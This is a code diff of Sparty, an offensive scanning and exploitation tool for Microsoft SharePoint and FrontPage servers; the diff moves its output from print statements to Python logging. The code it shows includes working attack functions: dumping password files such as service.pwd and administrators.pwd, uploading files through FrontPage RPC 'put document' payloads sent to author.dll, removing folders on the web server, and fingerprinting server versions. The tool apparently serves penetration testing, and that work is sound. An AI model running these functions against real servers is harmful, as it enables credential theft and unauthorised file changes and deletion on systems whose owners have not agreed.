@@ -7,11 +7,16 @@
 import os
 import re
 import sys
+import logging
 import urllib2
 import httplib
 import requests
 import optparse
 from ntlm import HTTPNtlmAuthHandler
+
+logname = "sparty"
+logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(logname)
 
 # Frontend (bin) repository files
 
@@ -182,52 +187,19 @@ sharepoint_target_layout = []
 sharepoint_target_forms = []
 sharepoint_target_catalog = []
 
-def _request(url, data=None, files=None):
-    """
-    Issue an HTTP request using python requests
-
-    Args:
-        url (str): endpoint URL
-        data (dict): data object
-        files (dict): files object
-    Returns:
-        the resulted object
-    """
-    try:
-        req = requests.post(url=url, data=data, files=files)
-    except requests.ConnectionError:
-    except requests.HTTPError:
-        print('Invalid HTTP response')
-    except requests.Timeout:
-        print('Connection timeout')
-    except requests.TooManyRedirects:
-        print('Too many redirects')
-    else:
-        print('Request URL: {0}'.format(url))
-        print('Request data: {0}'.format(data))
-        print('response: \n{0}'.format(req.text))
-    try:
-        if req.status_code != 200:
-            print('Failed to perfom request to {0}'.format(url))
-            print('Error code: {0}'.format(req.status_code))
-            print('Failed request: \n{0}'.format(req.text))
-    except:
-        print('Failed request: none returned')
-    else:
-        return req.json()
 
 def check_python():
     """
     Checks if the script is being run using python v3
     """
     version = sys.version_info
-    if version[:2][0] != 2:
-        print("Python3 not supported")
+    if version[:2][0] == 3:
+        logger.error("Python3 not supported")
         sys.exit(1)
 
 
 def banner():
-    print "\t---------------------------------------------------------------"
+    print("\t---------------------------------------------------------------")
     sparty_banner = """
           _|_|_|    _|_|_|     _|_|    _|_|_|    _|_|_|_|_|  _|      _|
          _|        _|    _|  _|    _|  _|    _|      _|        _|  _|
@@ -241,21 +213,25 @@ def banner():
         Powered by: SecNiche Security Labs | 2013
         Backed by:  Pentest Limited | 2015
         """
-    print sparty_banner
-    print "\t--------------------------------------------------------------"
+    print(sparty_banner)
+    print("\t--------------------------------------------------------------")
 
 
 def usage(destination):
     """
     Usage information
     """
-    print "[scanning access permissions in forms directory - sharepoint] %s -s forms -u  %s " % (sys.argv[0], destination)
-    print "[scanning access permissions in frontpage directory - frontpage] %s -f pvt -u %s " % (sys.argv[0], destination)
-    print "[dumping passwords] %s -d dump -u %s " % (sys.argv[0], destination)
-    print "[note] : please take this into consideration"
-    print "\t\t: (1) always specify https | http explicitly "
-    print "\t\t: (2) always provide the proper directory structure where sharepoint/frontpage is installed"
-    print "\t\t: (3) do not specify '/' at the end of url"
+    print(
+        "[scanning access permissions in forms directory - sharepoint] %s -s forms -u  %s " %
+        (sys.argv[0], destination))
+    print(
+        "[scanning access permissions in frontpage directory - frontpage] %s -f pvt -u %s " %
+        (sys.argv[0], destination))
+    print("[dumping passwords] %s -d dump -u %s " % (sys.argv[0], destination))
+    print("[note] : please take this into consideration")
+    print("\t\t: (1) always specify https | http explicitly")
+    print("\t\t: (2) always provide the proper directory structure where sharepoint/frontpage is installed")
+    print("\t\t: (3) do not specify '/' at the end of url")
 
 
 def build_target(target, front_dirs=[], refine_target=[]):
@@ -270,22 +246,26 @@ def success(module_name):
     """
     Display success notification
     """
-    print "\n[+] check for HTTP codes (200) for active list of accessible files or directories (404) - Not exists | (403) - Forbidden (500) - Server Error"
-    print "\n[+] (%s) - module executed successfully\n" % module_name
+    logger.info("\n[+] check for HTTP codes (200) for active list of accessible files or directories (404) - Not exists | (403) - Forbidden (500) - Server Error")
+    logger.info("\n[+] (%s) - module executed successfully\n" % module_name)
 
 
 def target_information(url):
     """
     Extract information about target's enviornment
     """
-    print "[+] fetching information from the given target : (%s)" % (url)
+    logger.info(
+        "[+] fetching information from the given target : (%s)" %
+        (url))
     try:
         r = requests.get(url)
-        print "[+] target responded with HTTP code: (%s)" % r.status_code
-        print "[+] target is running server: (%s)" % r.headers["server"]
+        logger.info(
+            "[+] target responded with HTTP code: (%s)" %
+            r.status_code)
+        logger.info("[+] target is running server: (%s)" % r.headers["server"])
 
     except urllib2.HTTPError as h:
-        print "[-] url error occured - (%s)" % h.code
+        logger.info("[-] url error occured - (%s)" % h.code)
         pass
 
 
@@ -298,13 +278,13 @@ def audit(target=[]):
             handle = urllib2.urlopen(element)
             info = handle.info()
             response_code = handle.getcode()
-            print "[+] (%s) - (%d)" % (element, response_code)
+            logger.info("[+] (%s) - (%d)" % (element, response_code))
 
         except urllib2.HTTPError as h:
-            print "[-] (%s) - (%d)" % (element, h.code)
+            logger.info("[-] (%s) - (%d)" % (element, h.code))
 
         except httplib.BadStatusLine:
-            print "[-] server responds with bad status"
+            logger.info("[-] server responds with bad status")
             pass
 
 
@@ -321,27 +301,33 @@ def dump_credentials(dest):
         try:
             handle = urllib2.urlopen(entry)
             if handle.getcode() == 200:
-                print "[+] dumping contents of file located at : (%s)" % (entry)
+                logger.info(
+                    "[+] dumping contents of file located at : (%s)" %
+                    (entry))
                 filename = "__dump__.txt"
                 dump = open(filename, 'a')
                 dump.write(handle.read())
-            print handle.read()
+            logger.info(handle.read())
 
         except urllib2.HTTPError as h:
-            print "[-] could not dump the file located at : (%s) | (%d)" % (entry, h.code)
+            logger.info(
+                "[-] could not dump the file located at : (%s) | (%d)" %
+                (entry, h.code))
             continue
 
         except httplib.BadStatusLine:
-            print "[-] server responds with bad status"
+            logger.info("[-] server responds with bad status")
             continue
 
-        print "[*] ---------------------------------------------------------------------------------------"
+        logger.info(
+            "[*] ---------------------------------------------------------------------------------------")
+    logger.info("[+] check the (%s) file if generated\n" % (filename))
 
-    print "[+] check the (%s) file if generated\n" % (filename)
 
-
-# fingerprinting frontpage version using default files
 def fingerprint_frontpage(name):
+    """
+    Fingerprint frontpage version using default files
+    """
     enum_nix = [
         '_vti_bin/_vti_aut/author.exe',
         '_vti_bin/_vti_adm/admin.exe',
@@ -361,7 +347,9 @@ def fingerprint_frontpage(name):
         try:
             info = urllib2.urlopen(entry)
             if info.getcode() == 200:
-                print "[+] front page is tested as : nix version |  (%s) | (%d)" % (entry, info.getcode())
+                logger.info(
+                    "[+] front page is tested as : nix version |  (%s) | (%d)" %
+                    (entry, info.getcode()))
 
         except urllib2.HTTPError:
             pass
@@ -373,56 +361,81 @@ def fingerprint_frontpage(name):
         try:
             info = urllib2.urlopen(entry)
             if info.getcode() == 200:
-                print "[+] front page is tested as : windows version |  (%s) | (%d)" % (entry, info.getcode())
+                logger.info(
+                    "[+] front page is tested as : windows version |  (%s) | (%d)" %
+                    (entry, info.getcode()))
 
         except urllib2.HTTPError:
+            logger.info(
+                "[-] failed to extract the version of frontpage from default file!")
+            pass
+
+        except httplib.BadStatusLine:
+            logger.info("[-] server responds with bad status")
             pass
 
     frontend_version = name + "/_vti_inf.html"
     try:
         version = urllib2.urlopen(frontend_version)
-        print"[+] extracting frontpage version from default file : (%s):" % re.findall(r'FPVersion=(.*)', version.read())
+        logger.info(
+            "[+] extracting frontpage version from default file : (%s):" %
+            re.findall(
+                r'FPVersion=(.*)',
+                version.read()))
 
     except urllib2.HTTPError:
-        print "[-] failed to extract the version of frontpage from default file"
+        logger.error(
+            "[-] failed to extract the version of frontpage from default file")
         pass
 
     except httplib.BadStatusLine:
-        print "[-] server responds with bad status"
+        logger.error("[-] server responds with bad status")
         pass
 
-    print "[*] ---------------------------------------------------------------------------------------"
-
+    logger.info(
+        "[*] ---------------------------------------------------------------------------------------")
 
 # dump sharepoint headers for version fingerprinting
+
+
 def dump_sharepoint_headers(name):
-    print ""
+    """
+    dump sharepoint headers for version fingerprint
+    """
     try:
         dump_s = urllib2.urlopen(name)
-        print "[+] configured sharepoint version is  : (%s)" % dump_s.info()['microsoftsharepointteamservices']
-
+        logger.info(
+            "[+] configured sharepoint version is  : (%s)" %
+            dump_s.info()['microsoftsharepointteamservices'])
     except KeyError:
-        print "[-] sharepoint version could not be extracted using HTTP header :  MicrosoftSharepointTeamServices"
+        logger.error(
+            "[-] sharepoint version could not be extracted using HTTP header :  MicrosoftSharepointTeamServices")
 
     try:
         dump_f = urllib2.urlopen(name)
-        print "[+] sharepoint is configured with load balancing capability : (%s)" % dump_f.info()['x-sharepointhealthscore']
+        logger.info(
+            "[+] sharepoint is configured with load balancing capability : (%s)" %
+            dump_f.info()['x-sharepointhealthscore'])
 
     except KeyError:
-        print "[-] sharepoint load balancing ability could not be determined using HTTP header : X-SharepointHealthScore"
+        logger.error(
+            "[-] sharepoint load balancing ability could not be determined using HTTP header : X-SharepointHealthScore")
 
     try:
         dump_g = urllib2.urlopen(name)
-        print "[+] sharepoint is configured with explicit diagnosis (GUID based log analysis) purposes : (%s)" % dump_f.info()['sprequestguid']
+        logger.info(
+            "[+] sharepoint is configured with explicit diagnosis (GUID based log analysis) purposes : (%s)" %
+            dump_f.info()['sprequestguid'])
 
     except KeyError:
-        print "[-] sharepoint diagnostics ability could not be determined using HTTP header : SPRequestGuid"
+        logger.error(
+            "[-] sharepoint diagnostics ability could not be determined using HTTP header : SPRequestGuid")
 
     except urllib2.HTTPError:
         pass
 
     except httplib.BadStatusLine:
-        print "[-] server responds with bad status"
+        logger.error("[-] server responds with bad status")
         pass
 
 
@@ -445,45 +458,60 @@ def frontpage_rpc_check(name):
     for item in exp_target_list:
         destination = name + "/" + item
 
-    print "[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening" % destination
+    logger.info(
+        "[+] Sending HTTP GET request to - (%s) for verifying whether RPC is listening" %
+        destination)
     try:
         req = urllib2.Request(destination)
         response = urllib2.urlopen(req)
         if response.getcode() == 200:
-            print "[+] target is listening on frontpage RPC - (%s)\n" % response.getcode()
+            logger.info(
+                "[+] target is listening on frontpage RPC - (%s)\n" %
+                response.getcode())
         else:
-            print "[-] target is not listening on frontpage RPC - (%s)\n" % response.getcode()
+            logger.info(
+                "[-] target is not listening on frontpage RPC - (%s)\n" %
+                response.getcode())
 
     except urllib2.URLError as e:
-        print "[-] url error, code: %s" % e.code
+        logger.error("[-] url error, code: %s" % e.code)
         pass
 
     except httplib.BadStatusLine as h:
-        print "[-] server responds with bad status"
+        logger.error("[-] server responds with bad status")
         pass
 
-    print "[+] Sending HTTP POST request to retrieve software version - (%s)" % destination
+    logger.info(
+        "[+] Sending HTTP POST request to retrieve software version - (%s)" %
+        destination)
     try:
         req = urllib2.Request(destination, data, headers)
         response = urllib2.urlopen(req)
         if response.getcode() == 200:
-            print "[+] target accepts the request - (%s) | (%s)\n" % (data, response.getcode())
+            logger.info(
+                "[+] target accepts the request - (%s) | (%s)\n" %
+                (data, response.getcode()))
             filename = "__version__.txt" + ".html"
             version = open(filename, 'a')
             version.write(response.read())
-            print "[+] check file for contents - (%s) \n" % filename
+            logger.info("[+] check file for contents - (%s) \n" % filename)
         else:
-            print "[-] target fails to accept request - (%s) | (%s)\n" % (data, response.getcode())
+            logger.info(
+                "[-] target fails to accept request - (%s) | (%s)\n" %
+                (data, response.getcode()))
 
     except urllib2.URLError as e:
-        print "[-] url error, seems like authentication is required or server failed to handle request - %s" % e.code
+        logger.error(
+            "[-] url error, seems like authentication is required or server failed to handle request - %s" %
+            e.code)
         pass
 
     except httplib.BadStatusLine:
-        print "[-] server responds with bad status"
+        logger.error("[-] server responds with bad status")
         pass
 
-    print "[*] ---------------------------------------------------------------------------------------"
+    logger.info(
+        "[*] ---------------------------------------------------------------------------------------")
 
 
 def frontpage_service_listing(name):
@@ -507,29 +535,38 @@ def frontpage_service_listing(name):
     for item in service_target_list:
         destination = name + "/" + item
 
-    print "[+] Sending HTTP POST request to retrieve service listing  - (%s)" % destination
+    logger.info(
+        "[+] Sending HTTP POST request to retrieve service listing  - (%s)" %
+        destination)
     try:
         for entry in data:
             req = urllib2.Request(destination, entry, headers)
             response = urllib2.urlopen(req)
             if response.getcode() == 200:
-                print "[+] target accepts the request - (%s) | (%s)" % (entry, response.getcode())
+                logger.info(
+                    "[+] target accepts the request - (%s) | (%s)" %
+                    (entry, response.getcode()))
                 filename = "__service-list__.txt" + entry + ".html"
                 service_list = open(filename, 'a')
                 service_list.write(response.read())
-                print "[+] check file for contents - (%s) \n" % filename
+                logger.info("[+] check file for contents - (%s) \n" % filename)
             else:
-                print "[-] target fails to accept request - (%s) | (%s)\n" % (data, response.getcode())
+                logger.info(
+                    "[-] target fails to accept request - (%s) | (%s)\n" %
+                    (data, response.getcode()))
 
     except urllib2.URLError as e:
-        print "[-] url error, seems like authentication is required or server failed to handle request! - %s" % e.code
+        logger.error(
+            "[-] url error, seems like authentication is required or server failed to handle request - %s" %
+            e.code)
         pass
 
     except httplib.BadStatusLine:
-        print "[-] server responds with bad status"
+        logger.error("[-] server responds with bad status")
         pass
 
-    print "[*] ---------------------------------------------------------------------------------------"
+    logger.info(
+        "[*] ---------------------------------------------------------------------------------------")
 
 
 def frontpage_config_check(name):
@@ -563,32 +600,41 @@ def frontpage_config_check(name):
 
     for item in payloads:
         destination = name + "/" + front_exp_target
-        print "[+] Sending HTTP POST request to [open service | listing documents] - (%s)" % destination
+        logger.info(
+            "[+] Sending HTTP POST request to [open service | listing documents] - (%s)" %
+            destination)
         try:
             req = urllib2.Request(destination, item, headers)
             response = urllib2.urlopen(req)
             if response.getcode() == 200:
-                print "[+] target accepts the request - (%s) | (%s)\n" % (item, response.getcode())
+                logger.info(
+                    "[+] target accepts the request - (%s) | (%s)\n" %
+                    (item, response.getcode()))
                 filename = "__author-dll-config__.txt" + ".html"
                 service_list = open(filename, 'a')
                 service_list.write(response.read())
-                print "[+] check file for contents - (%s) \n" % filename
+                logger.info("[+] check file for contents - (%s) \n" % filename)
 
             else:
-                print "[-] target fails to accept request - (%s) | (%s)\n" % (item, response.getcode())
+                logger.info(
+                    "[-] target fails to accept request - (%s) | (%s)\n" %
+                    (item, response.getcode()))
 
         except urllib2.URLError as e:
-            print "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" % (e.code, item)
+            logger.error(
+                "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" %
+                (e.code, item))
             pass
 
         except httplib.BadStatusLine:
-            print "[-] server responds with bad status"
+            logger.error("[-] server responds with bad status")
             pass
-
-# remove specific folder from the web server
 
 
 def frontpage_remove_folder(name):
+    """
+    Remove specific folder from the web server
+    """
     headers = {
         'MIME-Version': '4.0',
         'User-Agent': 'MSFrontPage/4.0',
@@ -609,23 +655,31 @@ def frontpage_remove_folder(name):
 
     for item in payloads:
         destination = name + "/" + file_exp_target
-        print "[+] Sending HTTP POST request to remove '/' directory to - (%s)" % destination
+        logger.info(
+            "[+] Sending HTTP POST request to remove '/' directory to - (%s)" %
+            destination)
         try:
             req = urllib2.Request(destination, item, headers)
             response = urllib2.urlopen(req)
             if response.getcode() == 200:
-                print "[+] folder removed successfully - (%s) | (%s)\n" % (item, response.getcode())
+                logger.info(
+                    "[+] folder removed successfully - (%s) | (%s)\n" %
+                    (item, response.getcode()))
                 for line in response.readlines():
-                    print line
+                    logger.info(line)
             else:
-                print "[-] fails to remove '/' folder at  - (%s) | (%s)\n" % (item, response.getcode())
+                logger.error(
+                    "[-] fails to remove '/' folder at  - (%s) | (%s)\n" %
+                    (item, response.getcode()))
 
         except urllib2.URLError as e:
-            print "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" % (e.code, item)
+            logger.error(
+                "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" %
+                (e.code, item))
             pass
 
         except httplib.BadStatusLine:
-            print "[-] server responds with bad status"
+            logger.error("[-] server responds with bad status")
             pass
 
 
@@ -644,6 +698,7 @@ def file_upload_check(name):
 
     os.system("echo 'Sparty Testing' > sparty.txt")
     file_exp_target = '_vti_bin/_vti_aut/author.dll'
+
     payloads = [
         'method=put document:3.0.2.1706&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
         'method=put document:4.0.2.4715&service_name=&document=[document_name=sparty.txt ; meta_info=[]]&put_option=overwrite&comment=&keep_checked_out=false',
@@ -653,44 +708,46 @@ def file_upload_check(name):
 
     for item in payloads:
         destination = name + "/" + file_exp_target
-        print "[+] Sending HTTP POST request for uploading file to - (%s)" % destination
+        logger.info(
+            "[+] Sending HTTP POST request for uploading file to - (%s)" %
+            destination)
         try:
             req = urllib2.Request(destination, item, headers)
             response = urllib2.urlopen(req)
             if response.getcode() == 200:
-                print "[+] file uploaded successfully - (%s) | (%s)\n" % (item, response.getcode())
+                logger.info(
+                    "[+] file uploaded successfully - (%s) | (%s)\n" %
+                    (item, response.getcode()))
                 for line in response.readlines():
-                    print line
+                    logger.info(line)
             else:
-                print "[-] file fails to upload at  - (%s) | (%s)\n" % (item, response.getcode())
+                logger.error(
+                    "[-] file fails to upload at  - (%s) | (%s)\n" %
+                    (item, response.getcode()))
 
         except urllib2.URLError as e:
-            print "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" % (e.code, item)
+            logger.error(
+                "[-] url error, seems like authentication is required or server failed to handle request - %s \n[-] payload [%s]\n" %
+                (e.code, item))
             pass
 
         except httplib.BadStatusLine:
-            print "[-] server responds with bad status"
+            logger.error("[-] server responds with bad status")
             pass
-
-# devalias.net - Authentication
 
 
 def enable_ntlm_authentication(user="", password="", url=""):
-    print "[+][devalias.net] Enabling NTLM authentication support"
-    # Import ntlm library
-    try:
-    # import ntlm
-        from ntlm import HTTPNtlmAuthHandler
-        print "[+][devalias.net][NTLM Authentication] NTLM Support Library Loaded"
-    except ImportError:
-        print "[-][devalias.net][NTLM Authentication] Program could not find module : ntlm (Is the ntlm library installed/available locally?"
-        sys.exit(1)
+    """
+    NTLM Authentication routine (implemented by devalias.net)
+    """
+    logger.info("[+][devalias.net] Enabling NTLM authentication support")
 
     try:
         from urlparse import urlparse, urlunparse
     except ImportError:
-        print "[-][devalias.net][NTLM Authentication] Program could not find module : urlparse"
-        sys.exit(1)
+        logger.error(
+            "[-][devalias.net][NTLM Authentication] Program could not find module : urlparse")
+        sys.exit(2)
 
     if user == "":
         user = raw_input("[+][devalias.net][NTLM Authentication] Enter username (DOMAIN\username): ")
@@ -722,12 +779,15 @@ def enable_ntlm_authentication(user="", password="", url=""):
         auth_basic)
     urllib2.install_opener(opener)
 
-    print "[+][devalias.net][NTLM authentication] Credentials enabled for " + user
-
-# main routine to trigger sub routines (functions)
+    logger.info(
+        "[+][devalias.net][NTLM authentication] Credentials enabled for " +
+        user)
 
 
 def main():
+    """
+    Main routine
+    """
     check_python()
     banner()
 
@@ -752,21 +812,25 @@ def main():
         type="string",
         help="target url to scan with proper structure",
         dest="url")
+
     front_page.add_option(
         "-f",
         "--frontpage",
         type="choice",
-        choices=['pvt',
-                 'bin'],
+        choices=[
+            'pvt',
+            'bin'],
         help="<FRONTPAGE = pvt | bin> -- to check access permissions on frontpage standard files in vti or bin directory",
         dest="frontpage")
+
     share_point.add_option(
         "-s",
         "--sharepoint",
         type="choice",
-        choices=['forms',
-                 'layouts',
-                 'catalog'],
+        choices=[
+            'forms',
+            'layouts',
+            'catalog'],
         help="<SHAREPOINT = forms | layouts | catalog> -- to check access permissions on sharepoint standard files in forms or layouts or catalog directory",
         dest="sharepoint")
 
@@ -774,37 +838,44 @@ def main():
         "-v",
         "--http_fingerprint",
         type="choice",
-        choices=['ms_sharepoint',
-                 'ms_frontpage'],
+        choices=[
+            'ms_sharepoint',
+            'ms_frontpage'],
         help="<FINGERPRINT = ms_sharepoint | ms_frontpage> -- fingerprint sharepoint or frontpage based on HTTP headers",
         dest="fingerprint")
+
     exploit.add_option(
         "-d",
         "--dump",
         type="choice",
-        choices=['dump',
-                 'extract'],
+        choices=[
+            'dump',
+            'extract'],
         help="<DUMP = dump | extract> -- dump credentials from default sharepoint and frontpage files (configuration errors and exposed entries)",
         dest="dump")
     exploit.add_option(
         "-l",
         "--list",
         type="choice",
-        choices=['list',
-                 'index'],
+        choices=[
+            'list',
+            'index'],
         help="<DIRECTORY = list | index> -- check directory listing and permissions",
         dest="directory")
+
     exploit.add_option(
         "-e",
         "--exploit",
         type="choice",
-        choices=['rpc_version_check',
-                 'rpc_service_listing',
-                 'author_config_check',
-                 'rpc_file_upload',
-                 'author_remove_folder'],
+        choices=[
+            'rpc_version_check',
+            'rpc_service_listing',
+            'author_config_check',
+            'rpc_file_upload',
+            'author_remove_folder'],
         help="EXPLOIT = <rpc_version_check | rpc_service_listing | rpc_file_upload | author_config_check | author_remove_folder> -- exploit vulnerable installations by checking RPC querying, service listing and file uploading",
         dest="exploit")
+
     exploit.add_option(
         "-i",
         "--services",
@@ -852,95 +923,124 @@ def main():
         if target is not None:
             target_information(target)
         else:
-            print "[-] specify the options. use (-h) for more help"
+            logger.info("[-] specify the options. use (-h) for more help")
             sys.exit(0)
 
+        if options.loglevel:
+            logger.setLevel(options.loglevel)
+        else:
+            logger.setLevel(logging.DEBUG)
+
         if options.dump == "dump" or options.dump == "extract":
-            print "\n[+]------------------------------------------------------------------------------------------------"
-            print "[+] dumping (service.pwd | authors.pwd | administrators.pwd | ws_ftp.log) files if possible!"
-            print "[+]--------------------------------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]------------------------------------------------------------------------------------------------")
+            logger.info(
+                "[+] dumping (service.pwd | authors.pwd | administrators.pwd | ws_ftp.log) files if possible")
+            logger.info(
+                "[+]--------------------------------------------------------------------------------------------------\n")
             dump_credentials(target)
-            module_success("password dumping")
+            success("password dumping")
             return
 
         elif options.exploit == "rpc_version_check":
-            print "\n[+]-----------------------------------------------------------------------"
-            print "[+] auditing frontpage RPC service                                          "
-            print "[+]-------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------------")
+            logger.info(
+                "[+] auditing frontpage RPC service                                          ")
+            logger.info(
+                "[+]-------------------------------------------------------------------------\n")
             frontpage_rpc_check(target)
-            module_success("module RPC version check")
+            success("module RPC version check")
             return
 
         elif options.exploit == "rpc_service_listing":
-            print "\n[+]-----------------------------------------------------------------------"
-            print "[+] auditing frontpage RPC service for fetching listing                     "
-            print "[+]-------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------------")
+            logger.info(
+                "[+] auditing frontpage RPC service for fetching listing                     ")
+            logger.info(
+                "[+]-------------------------------------------------------------------------\n")
             frontpage_service_listing(target)
-            module_success("module RPC service listing check")
+            success("module RPC service listing check")
             return
 
         elif options.exploit == "author_config_check":
-            print "\n[+]-----------------------------------------------------------------------"
-            print "[+] auditing frontpage configuration settings                               "
-            print "[+]-------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------------")
+            logger.info(
+                "[+] auditing frontpage configuration settings                               ")
+            logger.info(
+                "[+]-------------------------------------------------------------------------\n")
             frontpage_config_check(target)
-            module_success("module RPC check")
+            success("module RPC check")
             return
 
         elif options.exploit == "author_remove_folder":
-            print "\n[+]-----------------------------------------------------------------------"
-            print "[+] trying to remove folder from web server                                 "
-            print "[+]-------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------------")
+            logger.info(
+                "[+] trying to remove folder from web server                                 ")
+            logger.info(
+                "[+]-------------------------------------------------------------------------\n")
             frontpage_remove_folder(target)
-            module_success("module remove folder check")
+            success("module remove folder check")
             return
 
         elif options.exploit == "rpc_file_upload":
-            print "\n[+]-----------------------------------------------------------------------"
-            print "[+] auditing file uploading misconfiguration                                "
-            print "[+]-------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------------")
+            logger.info(
+                "[+] auditing file uploading misconfiguration                                ")
+            logger.info(
+                "[+]-------------------------------------------------------------------------\n")
             file_upload_check(target)
-            module_success("module file upload check")
+            success("module file upload check")
             return
 
         elif options.examples == "examples":
-            sparty_usage(target)
+            usage(target)
             return
 
         elif options.directory == "list" or options.directory == "index":
             build_target(target, directory_check, dir_target)
-            print "\n[+]-----------------------------------------------------------------------"
-            print "[+] auditing frontpage directory permissions (forbidden | index | not exist)"
-            print "[+]-------------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------------")
+            logger.info(
+                "[+] auditing frontpage directory permissions (forbidden | index | not exist)")
+            logger.info(
+                "[+]-------------------------------------------------------------------------\n")
             audit(dir_target)
-            module_success("directory check")
+            success("directory check")
             return
 
         elif options.frontpage == "bin":
             build_target(target, front_bin, refine_target)
-            print "\n[+]----------------------------------------"
-            print "[+] auditing frontpage '/_vti_bin/' directory"
-            print "[+]------------------------------------------\n"
+            logger.info("\n[+]----------------------------------------")
+            logger.info("[+] auditing frontpage '/_vti_bin/' directory")
+            logger.info("[+]------------------------------------------\n")
             audit(refine_target)
-            module_success("bin file access")
+            success("bin file access")
 
         elif options.frontpage == "pvt":
             build_target(target, front_pvt, pvt_target)
-            print "\n[+]---------------------------------------------------------"
-            print "[+] auditing '/_vti_pvt/' directory for sensitive information "
-            print "[+]-----------------------------------------------------------\n"
+            logger.info(
+                "\n[+]---------------------------------------------------------")
+            logger.info(
+                "[+] auditing '/_vti_pvt/' directory for sensitive information ")
+            logger.info(
+                "[+]-----------------------------------------------------------\n")
             audit(pvt_target)
-            module_success("pvt file access")
+            success("pvt file access")
             return
 
         elif options.fingerprint == "ms_sharepoint":
             dump_sharepoint_headers(target)
-            print "\n[+] sharepoint fingerprinting module completed\n"
+            logger.info("\n[+] sharepoint fingerprint module completed\n")
             return
 
         elif options.fingerprint == "ms_frontpage":
             fingerprint_frontpage(target)
-            print "\n[+] frontpage fingerprinting module completed\n"
+            logger.info("\n[+] frontpage fingerprint module completed\n")
             return
 
         elif options.sharepoint == "layouts":
@@ -948,11 +1048,14 @@ def main():
                 target,
                 sharepoint_check_layout,
                 sharepoint_target_layout)
-            print "\n[+]-----------------------------------------------------------------"
-            print "[+] auditing sharepoint '/_layouts/' directory for access permissions "
-            print "[+]-------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------")
+            logger.info(
+                "[+] auditing sharepoint '/_layouts/' directory for access permissions ")
+            logger.info(
+                "[+]-------------------------------------------------------------------\n")
             audit(sharepoint_target_layout)
-            module_success("layout file access")
+            success("layout file access")
             return
 
         elif options.sharepoint == "forms":
@@ -960,11 +1063,14 @@ def main():
                 target,
                 sharepoint_check_forms,
                 sharepoint_target_forms)
-            print "\n[+]--------------------------------------------------------------"
-            print "[+] auditing sharepoint '/forms/' directory for access permissions "
-            print "[+]----------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]--------------------------------------------------------------")
+            logger.info(
+                "[+] auditing sharepoint '/forms/' directory for access permissions ")
+            logger.info(
+                "[+]----------------------------------------------------------------\n")
             audit(sharepoint_target_forms)
-            module_success("forms file access")
+            success("forms file access")
             return
 
         elif options.sharepoint == "catalog":
@@ -972,34 +1078,42 @@ def main():
                 target,
                 sharepoint_check_catalog,
                 sharepoint_target_catalog)
-            print "\n[+]-----------------------------------------------------------------"
-            print "[+] auditing sharepoint '/catalog/' directory for access permissions"
-            print "[+]------------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]-----------------------------------------------------------------")
+            logger.info(
+                "[+] auditing sharepoint '/catalog/' directory for access permissions")
+            logger.info(
+                "[+]------------------------------------------------------------------\n")
             audit(sharepoint_target_catalog)
-            module_success("catalogs file access")
+            success("catalogs file access")
             return
 
         elif options.services == "serv" or options.services == "services":
             build_target(target, front_services, refine_target)
-            print "\n[+]---------------------------------------------------------------"
-            print "[+] checking exposed services in the frontpage/sharepoint  directory"
-            print "[+]-----------------------------------------------------------------\n"
+            logger.info(
+                "\n[+]---------------------------------------------------------------")
+            logger.info(
+                "[+] checking exposed services in the frontpage/sharepoint  directory")
+            logger.info(
+                "[+]-----------------------------------------------------------------\n")
             audit(refine_target)
-            module_success("exposed services check")
+            success("exposed services check")
 
         else:
-            print "[-] please provide the proper scanning options"
-            print "[+] check help (-h) for arguments and url specification"
+            logger.info("[-] please provide the proper scanning options")
+            logger.info(
+                "[+] check help (-h) for arguments and url specification")
             sys.exit(0)
 
     except ValueError as v:
-        print "[-] ValueError occurred. Improper option argument or url"
-        print "[+] check for help (-h) for more details"
+        logger.error(
+            "[-] ValueError occurred. Improper option argument or url")
+        logger.error("[+] check for help (-h) for more details")
         sys.exit(0)
 
     except TypeError as t:
-        print "[-] TypeError occcured. Missing option argument or url"
-        print "[+] check for help (-h) for more details"
+        logger.error("[-] TypeError occcured. Missing option argument or url")
+        logger.error("[+] check for help (-h) for more details")
         sys.exit(0)
 
     except IndexError as e:
@@ -1007,22 +1121,25 @@ def main():
         sys.exit(0)
 
     except urllib2.HTTPError as h:
-        print "[-] HTTPError : %s" % h.code
-        print "[+] please specify the target with protocol handlers as http | https"
+        logger.error("[-] HTTPError : %s" % h.code)
+        logger.error(
+            "[+] please specify the target with protocol handlers as http | https")
         sys.exit(0)
 
     except urllib2.URLError as u:
-        print "[-] URLError : %s" % u.args
-        print "[+] please specify the target with protocol handlers as http | https"
+        logger.error("[-] URLError : %s" % u.args)
+        logger.error(
+            "[+] please specify the target with protocol handlers as http | https")
         sys.exit(0)
 
     except KeyboardInterrupt:
-        print "[-] halt signal detected, exiting the program\n"
+        logger.error("[-] halt signal detected, exiting the program\n")
         sys.exit(0)
 
     except None:
-        print "[] Hey"
+        logger.info("[] Hey")
         sys.exit(0)
+
 # calling main
 if __name__ == '__main__':
     main()
